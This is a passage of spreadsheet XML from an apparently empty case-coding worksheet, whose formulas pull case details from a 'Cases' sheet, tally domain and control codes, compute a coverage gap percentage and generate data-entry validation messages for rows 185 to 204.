      <c r="AJ185" s="13">
        <f>IF(AI185="","",N(E185)*3+N(F185)*2+N(G185)*2+N(H185)*2+N(I185)*2+N(J185)*3+N(K185)*3+N(L185)*3)</f>
        <v/>
      </c>
      <c r="AK185" s="13">
        <f>IF(AI185="","",COUNTIF(N185:AG185,1))</f>
        <v/>
      </c>
      <c r="AL185" s="13">
        <f>IF(OR(AJ185="",AJ185=0),"",ROUND(100*(AJ185-AK185)/AJ185,1))</f>
        <v/>
      </c>
      <c r="AM185" s="11">
        <f>IF(AI185="","",IF(AI185=0,"No domain coded 1; ","")&amp;IF(M185="","Primary domain missing; ",IF(IFERROR(INDEX(E185:L185,1,M185),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N185:AG185)&lt;&gt;AJ185,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH185="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN185" s="13">
        <f>IF(AND(AI185&lt;&gt;"",AM185=""),1,0)</f>
        <v/>
      </c>
      <c r="AO185" s="14" t="n"/>
    </row>
    <row r="186">
      <c r="A186" s="11">
        <f>Cases!A186</f>
        <v/>
      </c>
      <c r="B186" s="11">
        <f>Cases!B186</f>
        <v/>
      </c>
      <c r="C186" s="11">
        <f>Cases!C186</f>
        <v/>
      </c>
      <c r="D186" s="11">
        <f>IF(Cases!F186="",LEFT(Cases!G186,120),Cases!F186)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E186:L186)=0,"",SUM(E186:L186))</f>
        <v/>
      </c>
      <c r="AJ186" s="13">
        <f>IF(AI186="","",N(E186)*3+N(F186)*2+N(G186)*2+N(H186)*2+N(I186)*2+N(J186)*3+N(K186)*3+N(L186)*3)</f>
        <v/>
      </c>
      <c r="AK186" s="13">
        <f>IF(AI186="","",COUNTIF(N186:AG186,1))</f>
        <v/>
      </c>
      <c r="AL186" s="13">
        <f>IF(OR(AJ186="",AJ186=0),"",ROUND(100*(AJ186-AK186)/AJ186,1))</f>
        <v/>
      </c>
      <c r="AM186" s="11">
        <f>IF(AI186="","",IF(AI186=0,"No domain coded 1; ","")&amp;IF(M186="","Primary domain missing; ",IF(IFERROR(INDEX(E186:L186,1,M186),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N186:AG186)&lt;&gt;AJ186,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH186="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN186" s="13">
        <f>IF(AND(AI186&lt;&gt;"",AM186=""),1,0)</f>
        <v/>
      </c>
      <c r="AO186" s="14" t="n"/>
    </row>
    <row r="187">
      <c r="A187" s="11">
        <f>Cases!A187</f>
        <v/>
      </c>
      <c r="B187" s="11">
        <f>Cases!B187</f>
        <v/>
      </c>
      <c r="C187" s="11">
        <f>Cases!C187</f>
        <v/>
      </c>
      <c r="D187" s="11">
        <f>IF(Cases!F187="",LEFT(Cases!G187,120),Cases!F187)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E187:L187)=0,"",SUM(E187:L187))</f>
        <v/>
      </c>
      <c r="AJ187" s="13">
        <f>IF(AI187="","",N(E187)*3+N(F187)*2+N(G187)*2+N(H187)*2+N(I187)*2+N(J187)*3+N(K187)*3+N(L187)*3)</f>
        <v/>
      </c>
      <c r="AK187" s="13">
        <f>IF(AI187="","",COUNTIF(N187:AG187,1))</f>
        <v/>
      </c>
      <c r="AL187" s="13">
        <f>IF(OR(AJ187="",AJ187=0),"",ROUND(100*(AJ187-AK187)/AJ187,1))</f>
        <v/>
      </c>
      <c r="AM187" s="11">
        <f>IF(AI187="","",IF(AI187=0,"No domain coded 1; ","")&amp;IF(M187="","Primary domain missing; ",IF(IFERROR(INDEX(E187:L187,1,M187),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N187:AG187)&lt;&gt;AJ187,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH187="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN187" s="13">
        <f>IF(AND(AI187&lt;&gt;"",AM187=""),1,0)</f>
        <v/>
      </c>
      <c r="AO187" s="14" t="n"/>
    </row>
    <row r="188">
      <c r="A188" s="11">
        <f>Cases!A188</f>
        <v/>
      </c>
      <c r="B188" s="11">
        <f>Cases!B188</f>
        <v/>
      </c>
      <c r="C188" s="11">
        <f>Cases!C188</f>
        <v/>
      </c>
      <c r="D188" s="11">
        <f>IF(Cases!F188="",LEFT(Cases!G188,120),Cases!F188)</f>
        <v/>
      </c>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c r="AI188" s="13">
        <f>IF(COUNT(E188:L188)=0,"",SUM(E188:L188))</f>
        <v/>
      </c>
      <c r="AJ188" s="13">
        <f>IF(AI188="","",N(E188)*3+N(F188)*2+N(G188)*2+N(H188)*2+N(I188)*2+N(J188)*3+N(K188)*3+N(L188)*3)</f>
        <v/>
      </c>
      <c r="AK188" s="13">
        <f>IF(AI188="","",COUNTIF(N188:AG188,1))</f>
        <v/>
      </c>
      <c r="AL188" s="13">
        <f>IF(OR(AJ188="",AJ188=0),"",ROUND(100*(AJ188-AK188)/AJ188,1))</f>
        <v/>
      </c>
      <c r="AM188" s="11">
        <f>IF(AI188="","",IF(AI188=0,"No domain coded 1; ","")&amp;IF(M188="","Primary domain missing; ",IF(IFERROR(INDEX(E188:L188,1,M188),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N188:AG188)&lt;&gt;AJ188,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH188="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN188" s="13">
        <f>IF(AND(AI188&lt;&gt;"",AM188=""),1,0)</f>
        <v/>
      </c>
      <c r="AO188" s="14" t="n"/>
    </row>
    <row r="189">
      <c r="A189" s="11">
        <f>Cases!A189</f>
        <v/>
      </c>
      <c r="B189" s="11">
        <f>Cases!B189</f>
        <v/>
      </c>
      <c r="C189" s="11">
        <f>Cases!C189</f>
        <v/>
      </c>
      <c r="D189" s="11">
        <f>IF(Cases!F189="",LEFT(Cases!G189,120),Cases!F189)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E189:L189)=0,"",SUM(E189:L189))</f>
        <v/>
      </c>
      <c r="AJ189" s="13">
        <f>IF(AI189="","",N(E189)*3+N(F189)*2+N(G189)*2+N(H189)*2+N(I189)*2+N(J189)*3+N(K189)*3+N(L189)*3)</f>
        <v/>
      </c>
      <c r="AK189" s="13">
        <f>IF(AI189="","",COUNTIF(N189:AG189,1))</f>
        <v/>
      </c>
      <c r="AL189" s="13">
        <f>IF(OR(AJ189="",AJ189=0),"",ROUND(100*(AJ189-AK189)/AJ189,1))</f>
        <v/>
      </c>
      <c r="AM189" s="11">
        <f>IF(AI189="","",IF(AI189=0,"No domain coded 1; ","")&amp;IF(M189="","Primary domain missing; ",IF(IFERROR(INDEX(E189:L189,1,M189),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N189:AG189)&lt;&gt;AJ189,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH189="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN189" s="13">
        <f>IF(AND(AI189&lt;&gt;"",AM189=""),1,0)</f>
        <v/>
      </c>
      <c r="AO189" s="14" t="n"/>
    </row>
    <row r="190">
      <c r="A190" s="11">
        <f>Cases!A190</f>
        <v/>
      </c>
      <c r="B190" s="11">
        <f>Cases!B190</f>
        <v/>
      </c>
      <c r="C190" s="11">
        <f>Cases!C190</f>
        <v/>
      </c>
      <c r="D190" s="11">
        <f>IF(Cases!F190="",LEFT(Cases!G190,120),Cases!F190)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E190:L190)=0,"",SUM(E190:L190))</f>
        <v/>
      </c>
      <c r="AJ190" s="13">
        <f>IF(AI190="","",N(E190)*3+N(F190)*2+N(G190)*2+N(H190)*2+N(I190)*2+N(J190)*3+N(K190)*3+N(L190)*3)</f>
        <v/>
      </c>
      <c r="AK190" s="13">
        <f>IF(AI190="","",COUNTIF(N190:AG190,1))</f>
        <v/>
      </c>
      <c r="AL190" s="13">
        <f>IF(OR(AJ190="",AJ190=0),"",ROUND(100*(AJ190-AK190)/AJ190,1))</f>
        <v/>
      </c>
      <c r="AM190" s="11">
        <f>IF(AI190="","",IF(AI190=0,"No domain coded 1; ","")&amp;IF(M190="","Primary domain missing; ",IF(IFERROR(INDEX(E190:L190,1,M190),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N190:AG190)&lt;&gt;AJ190,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH190="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN190" s="13">
        <f>IF(AND(AI190&lt;&gt;"",AM190=""),1,0)</f>
        <v/>
      </c>
      <c r="AO190" s="14" t="n"/>
    </row>
    <row r="191">
      <c r="A191" s="11">
        <f>Cases!A191</f>
        <v/>
      </c>
      <c r="B191" s="11">
        <f>Cases!B191</f>
        <v/>
      </c>
      <c r="C191" s="11">
        <f>Cases!C191</f>
        <v/>
      </c>
      <c r="D191" s="11">
        <f>IF(Cases!F191="",LEFT(Cases!G191,120),Cases!F191)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E191:L191)=0,"",SUM(E191:L191))</f>
        <v/>
      </c>
      <c r="AJ191" s="13">
        <f>IF(AI191="","",N(E191)*3+N(F191)*2+N(G191)*2+N(H191)*2+N(I191)*2+N(J191)*3+N(K191)*3+N(L191)*3)</f>
        <v/>
      </c>
      <c r="AK191" s="13">
        <f>IF(AI191="","",COUNTIF(N191:AG191,1))</f>
        <v/>
      </c>
      <c r="AL191" s="13">
        <f>IF(OR(AJ191="",AJ191=0),"",ROUND(100*(AJ191-AK191)/AJ191,1))</f>
        <v/>
      </c>
      <c r="AM191" s="11">
        <f>IF(AI191="","",IF(AI191=0,"No domain coded 1; ","")&amp;IF(M191="","Primary domain missing; ",IF(IFERROR(INDEX(E191:L191,1,M191),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N191:AG191)&lt;&gt;AJ191,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH191="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN191" s="13">
        <f>IF(AND(AI191&lt;&gt;"",AM191=""),1,0)</f>
        <v/>
      </c>
      <c r="AO191" s="14" t="n"/>
    </row>
    <row r="192">
      <c r="A192" s="11">
        <f>Cases!A192</f>
        <v/>
      </c>
      <c r="B192" s="11">
        <f>Cases!B192</f>
        <v/>
      </c>
      <c r="C192" s="11">
        <f>Cases!C192</f>
        <v/>
      </c>
      <c r="D192" s="11">
        <f>IF(Cases!F192="",LEFT(Cases!G192,120),Cases!F192)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E192:L192)=0,"",SUM(E192:L192))</f>
        <v/>
      </c>
      <c r="AJ192" s="13">
        <f>IF(AI192="","",N(E192)*3+N(F192)*2+N(G192)*2+N(H192)*2+N(I192)*2+N(J192)*3+N(K192)*3+N(L192)*3)</f>
        <v/>
      </c>
      <c r="AK192" s="13">
        <f>IF(AI192="","",COUNTIF(N192:AG192,1))</f>
        <v/>
      </c>
      <c r="AL192" s="13">
        <f>IF(OR(AJ192="",AJ192=0),"",ROUND(100*(AJ192-AK192)/AJ192,1))</f>
        <v/>
      </c>
      <c r="AM192" s="11">
        <f>IF(AI192="","",IF(AI192=0,"No domain coded 1; ","")&amp;IF(M192="","Primary domain missing; ",IF(IFERROR(INDEX(E192:L192,1,M192),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N192:AG192)&lt;&gt;AJ192,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH192="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN192" s="13">
        <f>IF(AND(AI192&lt;&gt;"",AM192=""),1,0)</f>
        <v/>
      </c>
      <c r="AO192" s="14" t="n"/>
    </row>
    <row r="193">
      <c r="A193" s="11">
        <f>Cases!A193</f>
        <v/>
      </c>
      <c r="B193" s="11">
        <f>Cases!B193</f>
        <v/>
      </c>
      <c r="C193" s="11">
        <f>Cases!C193</f>
        <v/>
      </c>
      <c r="D193" s="11">
        <f>IF(Cases!F193="",LEFT(Cases!G193,120),Cases!F193)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E193:L193)=0,"",SUM(E193:L193))</f>
        <v/>
      </c>
      <c r="AJ193" s="13">
        <f>IF(AI193="","",N(E193)*3+N(F193)*2+N(G193)*2+N(H193)*2+N(I193)*2+N(J193)*3+N(K193)*3+N(L193)*3)</f>
        <v/>
      </c>
      <c r="AK193" s="13">
        <f>IF(AI193="","",COUNTIF(N193:AG193,1))</f>
        <v/>
      </c>
      <c r="AL193" s="13">
        <f>IF(OR(AJ193="",AJ193=0),"",ROUND(100*(AJ193-AK193)/AJ193,1))</f>
        <v/>
      </c>
      <c r="AM193" s="11">
        <f>IF(AI193="","",IF(AI193=0,"No domain coded 1; ","")&amp;IF(M193="","Primary domain missing; ",IF(IFERROR(INDEX(E193:L193,1,M193),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N193:AG193)&lt;&gt;AJ193,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH193="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN193" s="13">
        <f>IF(AND(AI193&lt;&gt;"",AM193=""),1,0)</f>
        <v/>
      </c>
      <c r="AO193" s="14" t="n"/>
    </row>
    <row r="194">
      <c r="A194" s="11">
        <f>Cases!A194</f>
        <v/>
      </c>
      <c r="B194" s="11">
        <f>Cases!B194</f>
        <v/>
      </c>
      <c r="C194" s="11">
        <f>Cases!C194</f>
        <v/>
      </c>
      <c r="D194" s="11">
        <f>IF(Cases!F194="",LEFT(Cases!G194,120),Cases!F194)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E194:L194)=0,"",SUM(E194:L194))</f>
        <v/>
      </c>
      <c r="AJ194" s="13">
        <f>IF(AI194="","",N(E194)*3+N(F194)*2+N(G194)*2+N(H194)*2+N(I194)*2+N(J194)*3+N(K194)*3+N(L194)*3)</f>
        <v/>
      </c>
      <c r="AK194" s="13">
        <f>IF(AI194="","",COUNTIF(N194:AG194,1))</f>
        <v/>
      </c>
      <c r="AL194" s="13">
        <f>IF(OR(AJ194="",AJ194=0),"",ROUND(100*(AJ194-AK194)/AJ194,1))</f>
        <v/>
      </c>
      <c r="AM194" s="11">
        <f>IF(AI194="","",IF(AI194=0,"No domain coded 1; ","")&amp;IF(M194="","Primary domain missing; ",IF(IFERROR(INDEX(E194:L194,1,M194),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N194:AG194)&lt;&gt;AJ194,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH194="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN194" s="13">
        <f>IF(AND(AI194&lt;&gt;"",AM194=""),1,0)</f>
        <v/>
      </c>
      <c r="AO194" s="14" t="n"/>
    </row>
    <row r="195">
      <c r="A195" s="11">
        <f>Cases!A195</f>
        <v/>
      </c>
      <c r="B195" s="11">
        <f>Cases!B195</f>
        <v/>
      </c>
      <c r="C195" s="11">
        <f>Cases!C195</f>
        <v/>
      </c>
      <c r="D195" s="11">
        <f>IF(Cases!F195="",LEFT(Cases!G195,120),Cases!F195)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E195:L195)=0,"",SUM(E195:L195))</f>
        <v/>
      </c>
      <c r="AJ195" s="13">
        <f>IF(AI195="","",N(E195)*3+N(F195)*2+N(G195)*2+N(H195)*2+N(I195)*2+N(J195)*3+N(K195)*3+N(L195)*3)</f>
        <v/>
      </c>
      <c r="AK195" s="13">
        <f>IF(AI195="","",COUNTIF(N195:AG195,1))</f>
        <v/>
      </c>
      <c r="AL195" s="13">
        <f>IF(OR(AJ195="",AJ195=0),"",ROUND(100*(AJ195-AK195)/AJ195,1))</f>
        <v/>
      </c>
      <c r="AM195" s="11">
        <f>IF(AI195="","",IF(AI195=0,"No domain coded 1; ","")&amp;IF(M195="","Primary domain missing; ",IF(IFERROR(INDEX(E195:L195,1,M195),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N195:AG195)&lt;&gt;AJ195,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH195="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN195" s="13">
        <f>IF(AND(AI195&lt;&gt;"",AM195=""),1,0)</f>
        <v/>
      </c>
      <c r="AO195" s="14" t="n"/>
    </row>
    <row r="196">
      <c r="A196" s="11">
        <f>Cases!A196</f>
        <v/>
      </c>
      <c r="B196" s="11">
        <f>Cases!B196</f>
        <v/>
      </c>
      <c r="C196" s="11">
        <f>Cases!C196</f>
        <v/>
      </c>
      <c r="D196" s="11">
        <f>IF(Cases!F196="",LEFT(Cases!G196,120),Cases!F196)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E196:L196)=0,"",SUM(E196:L196))</f>
        <v/>
      </c>
      <c r="AJ196" s="13">
        <f>IF(AI196="","",N(E196)*3+N(F196)*2+N(G196)*2+N(H196)*2+N(I196)*2+N(J196)*3+N(K196)*3+N(L196)*3)</f>
        <v/>
      </c>
      <c r="AK196" s="13">
        <f>IF(AI196="","",COUNTIF(N196:AG196,1))</f>
        <v/>
      </c>
      <c r="AL196" s="13">
        <f>IF(OR(AJ196="",AJ196=0),"",ROUND(100*(AJ196-AK196)/AJ196,1))</f>
        <v/>
      </c>
      <c r="AM196" s="11">
        <f>IF(AI196="","",IF(AI196=0,"No domain coded 1; ","")&amp;IF(M196="","Primary domain missing; ",IF(IFERROR(INDEX(E196:L196,1,M196),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N196:AG196)&lt;&gt;AJ196,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH196="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN196" s="13">
        <f>IF(AND(AI196&lt;&gt;"",AM196=""),1,0)</f>
        <v/>
      </c>
      <c r="AO196" s="14" t="n"/>
    </row>
    <row r="197">
      <c r="A197" s="11">
        <f>Cases!A197</f>
        <v/>
      </c>
      <c r="B197" s="11">
        <f>Cases!B197</f>
        <v/>
      </c>
      <c r="C197" s="11">
        <f>Cases!C197</f>
        <v/>
      </c>
      <c r="D197" s="11">
        <f>IF(Cases!F197="",LEFT(Cases!G197,120),Cases!F197)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E197:L197)=0,"",SUM(E197:L197))</f>
        <v/>
      </c>
      <c r="AJ197" s="13">
        <f>IF(AI197="","",N(E197)*3+N(F197)*2+N(G197)*2+N(H197)*2+N(I197)*2+N(J197)*3+N(K197)*3+N(L197)*3)</f>
        <v/>
      </c>
      <c r="AK197" s="13">
        <f>IF(AI197="","",COUNTIF(N197:AG197,1))</f>
        <v/>
      </c>
      <c r="AL197" s="13">
        <f>IF(OR(AJ197="",AJ197=0),"",ROUND(100*(AJ197-AK197)/AJ197,1))</f>
        <v/>
      </c>
      <c r="AM197" s="11">
        <f>IF(AI197="","",IF(AI197=0,"No domain coded 1; ","")&amp;IF(M197="","Primary domain missing; ",IF(IFERROR(INDEX(E197:L197,1,M197),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N197:AG197)&lt;&gt;AJ197,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH197="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN197" s="13">
        <f>IF(AND(AI197&lt;&gt;"",AM197=""),1,0)</f>
        <v/>
      </c>
      <c r="AO197" s="14" t="n"/>
    </row>
    <row r="198">
      <c r="A198" s="11">
        <f>Cases!A198</f>
        <v/>
      </c>
      <c r="B198" s="11">
        <f>Cases!B198</f>
        <v/>
      </c>
      <c r="C198" s="11">
        <f>Cases!C198</f>
        <v/>
      </c>
      <c r="D198" s="11">
        <f>IF(Cases!F198="",LEFT(Cases!G198,120),Cases!F198)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E198:L198)=0,"",SUM(E198:L198))</f>
        <v/>
      </c>
      <c r="AJ198" s="13">
        <f>IF(AI198="","",N(E198)*3+N(F198)*2+N(G198)*2+N(H198)*2+N(I198)*2+N(J198)*3+N(K198)*3+N(L198)*3)</f>
        <v/>
      </c>
      <c r="AK198" s="13">
        <f>IF(AI198="","",COUNTIF(N198:AG198,1))</f>
        <v/>
      </c>
      <c r="AL198" s="13">
        <f>IF(OR(AJ198="",AJ198=0),"",ROUND(100*(AJ198-AK198)/AJ198,1))</f>
        <v/>
      </c>
      <c r="AM198" s="11">
        <f>IF(AI198="","",IF(AI198=0,"No domain coded 1; ","")&amp;IF(M198="","Primary domain missing; ",IF(IFERROR(INDEX(E198:L198,1,M198),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N198:AG198)&lt;&gt;AJ198,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH198="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN198" s="13">
        <f>IF(AND(AI198&lt;&gt;"",AM198=""),1,0)</f>
        <v/>
      </c>
      <c r="AO198" s="14" t="n"/>
    </row>
    <row r="199">
      <c r="A199" s="11">
        <f>Cases!A199</f>
        <v/>
      </c>
      <c r="B199" s="11">
        <f>Cases!B199</f>
        <v/>
      </c>
      <c r="C199" s="11">
        <f>Cases!C199</f>
        <v/>
      </c>
      <c r="D199" s="11">
        <f>IF(Cases!F199="",LEFT(Cases!G199,120),Cases!F199)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E199:L199)=0,"",SUM(E199:L199))</f>
        <v/>
      </c>
      <c r="AJ199" s="13">
        <f>IF(AI199="","",N(E199)*3+N(F199)*2+N(G199)*2+N(H199)*2+N(I199)*2+N(J199)*3+N(K199)*3+N(L199)*3)</f>
        <v/>
      </c>
      <c r="AK199" s="13">
        <f>IF(AI199="","",COUNTIF(N199:AG199,1))</f>
        <v/>
      </c>
      <c r="AL199" s="13">
        <f>IF(OR(AJ199="",AJ199=0),"",ROUND(100*(AJ199-AK199)/AJ199,1))</f>
        <v/>
      </c>
      <c r="AM199" s="11">
        <f>IF(AI199="","",IF(AI199=0,"No domain coded 1; ","")&amp;IF(M199="","Primary domain missing; ",IF(IFERROR(INDEX(E199:L199,1,M199),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N199:AG199)&lt;&gt;AJ199,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH199="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN199" s="13">
        <f>IF(AND(AI199&lt;&gt;"",AM199=""),1,0)</f>
        <v/>
      </c>
      <c r="AO199" s="14" t="n"/>
    </row>
    <row r="200">
      <c r="A200" s="11">
        <f>Cases!A200</f>
        <v/>
      </c>
      <c r="B200" s="11">
        <f>Cases!B200</f>
        <v/>
      </c>
      <c r="C200" s="11">
        <f>Cases!C200</f>
        <v/>
      </c>
      <c r="D200" s="11">
        <f>IF(Cases!F200="",LEFT(Cases!G200,120),Cases!F200)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E200:L200)=0,"",SUM(E200:L200))</f>
        <v/>
      </c>
      <c r="AJ200" s="13">
        <f>IF(AI200="","",N(E200)*3+N(F200)*2+N(G200)*2+N(H200)*2+N(I200)*2+N(J200)*3+N(K200)*3+N(L200)*3)</f>
        <v/>
      </c>
      <c r="AK200" s="13">
        <f>IF(AI200="","",COUNTIF(N200:AG200,1))</f>
        <v/>
      </c>
      <c r="AL200" s="13">
        <f>IF(OR(AJ200="",AJ200=0),"",ROUND(100*(AJ200-AK200)/AJ200,1))</f>
        <v/>
      </c>
      <c r="AM200" s="11">
        <f>IF(AI200="","",IF(AI200=0,"No domain coded 1; ","")&amp;IF(M200="","Primary domain missing; ",IF(IFERROR(INDEX(E200:L200,1,M200),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N200:AG200)&lt;&gt;AJ200,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH200="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN200" s="13">
        <f>IF(AND(AI200&lt;&gt;"",AM200=""),1,0)</f>
        <v/>
      </c>
      <c r="AO200" s="14" t="n"/>
    </row>
    <row r="201">
      <c r="A201" s="11">
        <f>Cases!A201</f>
        <v/>
      </c>
      <c r="B201" s="11">
        <f>Cases!B201</f>
        <v/>
      </c>
      <c r="C201" s="11">
        <f>Cases!C201</f>
        <v/>
      </c>
      <c r="D201" s="11">
        <f>IF(Cases!F201="",LEFT(Cases!G201,120),Cases!F201)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E201:L201)=0,"",SUM(E201:L201))</f>
        <v/>
      </c>
      <c r="AJ201" s="13">
        <f>IF(AI201="","",N(E201)*3+N(F201)*2+N(G201)*2+N(H201)*2+N(I201)*2+N(J201)*3+N(K201)*3+N(L201)*3)</f>
        <v/>
      </c>
      <c r="AK201" s="13">
        <f>IF(AI201="","",COUNTIF(N201:AG201,1))</f>
        <v/>
      </c>
      <c r="AL201" s="13">
        <f>IF(OR(AJ201="",AJ201=0),"",ROUND(100*(AJ201-AK201)/AJ201,1))</f>
        <v/>
      </c>
      <c r="AM201" s="11">
        <f>IF(AI201="","",IF(AI201=0,"No domain coded 1; ","")&amp;IF(M201="","Primary domain missing; ",IF(IFERROR(INDEX(E201:L201,1,M201),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N201:AG201)&lt;&gt;AJ201,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH201="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN201" s="13">
        <f>IF(AND(AI201&lt;&gt;"",AM201=""),1,0)</f>
        <v/>
      </c>
      <c r="AO201" s="14" t="n"/>
    </row>
    <row r="202">
      <c r="A202" s="11">
        <f>Cases!A202</f>
        <v/>
      </c>
      <c r="B202" s="11">
        <f>Cases!B202</f>
        <v/>
      </c>
      <c r="C202" s="11">
        <f>Cases!C202</f>
        <v/>
      </c>
      <c r="D202" s="11">
        <f>IF(Cases!F202="",LEFT(Cases!G202,120),Cases!F202)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E202:L202)=0,"",SUM(E202:L202))</f>
        <v/>
      </c>
      <c r="AJ202" s="13">
        <f>IF(AI202="","",N(E202)*3+N(F202)*2+N(G202)*2+N(H202)*2+N(I202)*2+N(J202)*3+N(K202)*3+N(L202)*3)</f>
        <v/>
      </c>
      <c r="AK202" s="13">
        <f>IF(AI202="","",COUNTIF(N202:AG202,1))</f>
        <v/>
      </c>
      <c r="AL202" s="13">
        <f>IF(OR(AJ202="",AJ202=0),"",ROUND(100*(AJ202-AK202)/AJ202,1))</f>
        <v/>
      </c>
      <c r="AM202" s="11">
        <f>IF(AI202="","",IF(AI202=0,"No domain coded 1; ","")&amp;IF(M202="","Primary domain missing; ",IF(IFERROR(INDEX(E202:L202,1,M202),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N202:AG202)&lt;&gt;AJ202,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH202="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN202" s="13">
        <f>IF(AND(AI202&lt;&gt;"",AM202=""),1,0)</f>
        <v/>
      </c>
      <c r="AO202" s="14" t="n"/>
    </row>
    <row r="203">
      <c r="A203" s="11">
        <f>Cases!A203</f>
        <v/>
      </c>
      <c r="B203" s="11">
        <f>Cases!B203</f>
        <v/>
      </c>
      <c r="C203" s="11">
        <f>Cases!C203</f>
        <v/>
      </c>
      <c r="D203" s="11">
        <f>IF(Cases!F203="",LEFT(Cases!G203,120),Cases!F203)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E203:L203)=0,"",SUM(E203:L203))</f>
        <v/>
      </c>
      <c r="AJ203" s="13">
        <f>IF(AI203="","",N(E203)*3+N(F203)*2+N(G203)*2+N(H203)*2+N(I203)*2+N(J203)*3+N(K203)*3+N(L203)*3)</f>
        <v/>
      </c>
      <c r="AK203" s="13">
        <f>IF(AI203="","",COUNTIF(N203:AG203,1))</f>
        <v/>
      </c>
      <c r="AL203" s="13">
        <f>IF(OR(AJ203="",AJ203=0),"",ROUND(100*(AJ203-AK203)/AJ203,1))</f>
        <v/>
      </c>
      <c r="AM203" s="11">
        <f>IF(AI203="","",IF(AI203=0,"No domain coded 1; ","")&amp;IF(M203="","Primary domain missing; ",IF(IFERROR(INDEX(E203:L203,1,M203),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N203:AG203)&lt;&gt;AJ203,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH203="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN203" s="13">
        <f>IF(AND(AI203&lt;&gt;"",AM203=""),1,0)</f>
        <v/>
      </c>
      <c r="AO203" s="14" t="n"/>
    </row>
    <row r="204">
      <c r="A204" s="11">
        <f>Cases!A204</f>
        <v/>
      </c>
      <c r="B204" s="11">
        <f>Cases!B204</f>
        <v/>
      </c>
      <c r="C204" s="11">
        <f>Cases!C204</f>
        <v/>
      </c>
